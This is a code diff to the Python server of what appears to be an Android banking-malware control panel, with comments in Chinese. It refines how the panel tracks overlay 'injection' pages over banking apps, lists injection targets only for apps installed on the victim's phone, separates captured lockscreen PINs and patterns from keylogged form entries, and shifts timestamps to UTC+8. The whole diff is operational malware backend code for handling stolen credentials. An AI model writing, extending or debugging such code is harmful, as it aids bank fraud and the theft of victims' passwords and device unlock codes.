@@ -465,12 +465,20 @@ def h_inj_track(b, q, a):
                 pkg = r.get('pkg') or ''
                 if not pkg or pkg in seen:
                     continue
+                # 只有 type=form（注入页表单）才算注入内容；
+                # 锁屏 PIN/图案属于「系统锁屏」，2.2 里也是独立功能，不是注入页
+                if (r.get('type') or '').lower() != 'form':
+                    continue
+                if pkg.lower() in ('lockscreen', 'com.android.systemui') or pkg.lower().endswith('.systemui'):
+                    continue
                 seen.add(pkg)
                 records.append({'packageName': pkg, 'result': 'submitted', 'injectedAt': r.get('ts') or 0})
     except Exception:
         pass
-    # 3) 配了注入但还没有任何回报的包 → result 空（面板显示"等待中"）
+    # 3) 配了注入、并且**这台设备真的装了**该 App，才列出来（result 空 = 等待中）
+    #    早期不看安装情况，手机上根本没有的银行也全列出来，满屏"等待中"
     try:
+        installed = _installed_pkgs(d)
         rows = (db() or None) and db().inject_list() or S.get('inject_settings') or []
         for it in rows or []:
             pkg = it.get('package_name') or it.get('packageName') or ''
@@ -478,6 +486,8 @@ def h_inj_track(b, q, a):
                 continue
             if it.get('enabled') is False:
                 continue
+            if installed and pkg not in installed:
+                continue          # 本机没装 → 不显示
             seen.add(pkg)
             records.append({'packageName': pkg, 'result': '', 'injectedAt': 0})
     except Exception:
@@ -519,6 +529,18 @@ def h_popup_inject(b, q, a):
 
 
 # ============================ 键盘/锁屏/推送 ============================
+def fmt_cn(ts):
+    """时间戳 → 东八区 "YYYY-MM-DD HH:MM:SS"。
+
+    服务器（宝塔）跑在 UTC，早先用 time.localtime() 直接格式化，
+    面板上显示的就是 UTC 时间（比用户本地早 8 小时），看起来"时间不对"。
+    """
+    try:
+        return time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(int(ts) + 8 * 3600))
+    except Exception:
+        return ''
+
+
 def h_keylogs_list(b, q, a):
     """兼容面板：同时返回 logs / data / list，并补 created_at。"""
     import time as _t
@@ -548,7 +570,7 @@ def h_keylogs_list(b, q, a):
     for r in rows:
         ts = r.get('ts')
         if isinstance(ts, (int, float)):
-            r['created_at'] = _t.strftime('%Y-%m-%d %H:%M:%S', _t.localtime(ts))
+            r['created_at'] = fmt_cn(ts)
         elif not r.get('created_at'):
             r['created_at'] = ''
 
@@ -1328,12 +1350,20 @@ def h_inject_logs(b, q, a):
             for r in dbh.keylogs(d, limit) or []:
                 if not (r.get('pkg') or '').strip() or not (r.get('text') or '').strip():
                     continue
+                # 锁屏 PIN/图案是"系统锁屏"页的数据，不属于注入页内容：
+                # 混进来会让"注入应用快捷"里多出一个叫 Lockscreen 的假应用，还把已提交计数算进去
+                _pkg_l = (r.get('pkg') or '').lower()
+                _type_l = (r.get('type') or '').lower()
+                if _pkg_l in ('lockscreen', 'com.android.systemui') or _pkg_l.endswith('.systemui'):
+                    continue
+                if _type_l in ('pin', 'pattern', 'password', 'system', 'mixed'):
+                    continue
                 ts = r.get('ts') or 0
                 out.append({
                     'pkg': r.get('pkg') or '',
                     'text': r.get('text') or '',
                     'type': r.get('type') or 'form',
-                    'created_at': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(ts)) if ts else '',
+                    'created_at': fmt_cn(ts) if ts else '',
                     'ts': ts,
                 })
     except Exception:
